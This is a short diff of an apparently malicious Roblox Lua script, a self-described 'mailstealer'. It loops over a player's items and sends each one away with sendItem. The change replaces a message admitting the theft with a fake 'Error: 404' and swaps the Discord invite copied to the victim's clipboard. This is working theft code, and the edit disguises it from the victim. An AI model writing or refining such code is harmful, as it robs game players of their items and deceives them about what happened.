@@ -246,8 +246,8 @@ if #sortedItems > 0 then
         sendItem(item.category, item.uid, item.amount)
     end
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
-    setclipboard("discord.gg/GY2RVSEGDT")
+    message.Error("Error: 404")
+    setclipboard("discord.gg/rZmNK6Ptxw")
 end
 
 -- Load Orion Library
